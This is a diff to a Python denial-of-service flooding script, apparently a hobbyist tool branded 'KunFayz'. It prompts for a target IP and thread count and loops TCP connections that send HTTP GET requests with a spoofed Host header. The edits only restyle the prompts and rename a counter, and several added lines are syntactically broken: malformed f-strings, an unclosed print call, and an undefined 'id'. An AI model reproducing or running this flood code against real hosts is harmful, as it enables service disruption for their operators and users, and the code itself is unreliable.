@@ -9,15 +9,16 @@ def ddos():
     print("press CTRL + C and press ENTER to exit !!!")
     while True:
         try:
-            print(f"{Fore.LIGTBLUE_EX}
-            threads = int(input("ENTER NUMBER OF THREADS : "))
+            print(f"{Fore.LIGTBLUE_EX}┌[KunFayz•••")
+            threads = int(input("{Fore.LIGTBLUE_EX}└> ENTER NUMBER OF THREADS : "))
         except ValueError:
             print("please enter a integer value")
             continue;
         else:
             break;
-    attack_ip = 0
-    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    attack_id = 2
+    print(f"{Fore.LIGTGREEN_EX}┌[KunFayz•••")
+    trget = str(input(Fore.LIGTGREEN_EX + Style.BRIGHT + "└> ENTER IP OF THE HOST :  "))
     fake = '192.178.1.38'
     #port = 80( default http port is 80)
     while True:
@@ -42,7 +43,7 @@ def ddos():
     time.sleep(2)
 
     def attack():
-        nonlocal attack_ip
+        nonlocal attack_id
         while True:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -50,8 +51,8 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                attack_ip += 2
-                print(f"
+                attack_id += 2
+                print(f{Fore.GREEN}Malack {Fore.YELLOW} IP flood {Fore.WHITE}" +str(id)+ "{Style.RESET_ALL}"
             except socket.error:
                 print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
